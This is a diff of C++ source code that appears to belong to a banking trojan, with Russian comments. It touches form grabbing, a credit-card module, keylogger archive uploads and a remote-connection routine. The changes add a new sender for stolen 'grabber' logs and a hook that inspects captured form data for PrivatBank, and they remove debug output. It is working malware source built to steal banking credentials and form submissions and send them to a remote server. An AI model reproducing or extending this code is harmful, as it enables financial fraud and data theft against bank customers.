@@ -9,6 +9,7 @@
 #include "Inject.h"
 #include "Task.h"
 #include "PostDataGrabber.h"
+#include "Grabbers.h"
 
 #include "CreditCardNomber.cpp"
 
@@ -259,13 +260,11 @@ DWORD ConnectThread(LPVOID lpParameter)
 	
 	if ( (int)pconnect( connData->Socket, (const struct sockaddr*)&connData->SockAddr, sizeof( connData->SockAddr ) ) == SOCKET_ERROR )
 	{
-		//OutputDebugStringA("connect ERROR");
 		DWORD err = (DWORD)pGetLastError();
 		pclosesocket(connData->Socket);
 		pExitThread(-1);
 	}
-	/*else
-		OutputDebugStringA("connect SUCCESS");*/
+
 
 	pExitThread(0);
 	return 0;
@@ -296,17 +295,13 @@ SOCKET MyConnect( char *Host, int Port )
 			return -1;
 		connData.Socket = Socket;
 
-		//OutputDebugStringA("Connection...");
 		HANDLE ConnectThreadHandle = (HANDLE)pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ConnectThread, &connData, NULL, 0);
 		if((long)pWaitForSingleObject(ConnectThreadHandle, 10000) == WAIT_TIMEOUT)
 		{
 			if((int)pshutdown(Socket, 2) == SOCKET_ERROR)
 			{
-				//wsprintfA(&str[0], "WSA_Err:%d", WSAGetLastError());
-				//OutputDebugStringA(&str[0]);
 			}
 			pTerminateThread(ConnectThreadHandle, 1);
-			//pOutputDebugStringA("Connection timeout (> 10 sec)");
 		}
 		DWORD exitCode = 0;
 		BOOL res = (BOOL)pGetExitCodeThread(ConnectThreadHandle, &exitCode);
@@ -1532,9 +1527,15 @@ namespace DataSender
 			const static DWORD WaitInterval = 30*1000;
     	#endif
 
+        TGrabberFileSender GrabberFiles; // Новая версия грабера
+
 		while (1)
 		{
 			LDBG("Loader", "Обрабатываем хранилище отправляемых данных");
+
+			// Отправляем новые логи
+            GrabberFiles.SendFiles();
+
 			// Отправляем файлы грабера
 			SearchFiles(Path, (PCHAR)DataFileMask, false, FA_ANY_FILES, Files, ProcessDataFile);
 
@@ -1711,6 +1712,12 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 		//оповещаем о получении пост данных
 		PostDataGrabber::DoEvents( URL, Data );
 	#endif
+
+
+	#ifdef PrivatBankH
+        PrivatBank::CheckPostData(URL, Data);
+	#endif
+
 	// Добавить данные HTML формы
 	LDBG("Loader", "Добавляем в хранилище HTML данные");
 	
@@ -1923,7 +1930,7 @@ bool DataGrabber::SendFormGrabberData(PDataFile File)
 bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* InvalidFile)
 {
 	// Отправляем пост запрос на скрипт хранения данных кейлогера
-	if (InvalidFile != NULL)
+	if (InvalidFile)
     	*InvalidFile = false;
 
 	if (!FileExistsA(CabFileName))
@@ -1981,7 +1988,7 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	if (!Result && Response.Code == 404)
 	{
 		if (InvalidFile != NULL)
-        	*InvalidFile = true;
+			*InvalidFile = true;
 		PCHAR ErrorText = NULL;
 		#ifdef LOADER_GET_ERROR
 			ErrorText = HTTPParser::GetHeaderValue(Response.ResponseText, HTTPHeaderError);
